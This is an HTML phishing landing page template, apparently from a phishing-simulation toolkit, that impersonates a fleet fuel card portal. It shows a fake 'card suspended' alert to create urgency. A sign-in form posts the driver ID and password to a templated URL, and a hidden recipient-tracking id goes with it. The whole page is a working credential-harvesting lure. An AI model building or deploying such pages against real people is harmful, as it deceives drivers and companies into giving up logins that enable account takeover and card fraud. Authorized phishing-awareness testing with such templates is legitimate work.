<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Fleet Fuel Card Portal</title>
    <style>
      body { margin: 0; font-family: Arial, sans-serif;
             background: #f3f4f6; color: #1a1a1a; }
      .hdr { background: #b03030; color: #fff; padding: 14px 24px;
             font-size: 16px; font-weight: 600; }
      .panel { max-width: 400px; margin: 60px auto; background: #fff;
               border: 1px solid #d1d5db; padding: 26px; border-radius: 4px; }
      .alert { background: #fdecec; border-left: 3px solid #b03030;
               padding: 8px 10px; font-size: 12px; margin-bottom: 16px; }
      label { display: block; font-size: 12px; color: #444; margin: 10px 0 4px; }
      input { width: 100%; padding: 8px; box-sizing: border-box;
              border: 1px solid #c0c6cd; border-radius: 3px; font-size: 14px; }
      button { width: 100%; margin-top: 18px; padding: 10px;
               background: #b03030; color: #fff; border: 0; border-radius: 3px;
               font-size: 14px; cursor: pointer; }
      .foot { font-size: 11px; color: #888; text-align: center; margin-top: 14px; }
    </style>
  </head>
  <body>
    <div class="hdr">Fleet Fuel Card Portal</div>
    <div class="panel">
      <div class="alert">Card **** 4471 is suspended. Sign in to dispute or confirm.</div>
      <form action="{{.URL}}" method="post" autocomplete="off">
        <input type="hidden" name="rid" value="{{.RId}}">
        <label for="u">Driver ID or company username</label>
        <input id="u" name="driver_id" type="text">
        <label for="p">Password</label>
        <input id="p" name="driver_pw" type="password">
        <button type="submit">Sign in &amp; review</button>
      </form>
      <p class="foot">Never share your card PIN. Account access is logged.</p>
    </div>
  </body>
</html>
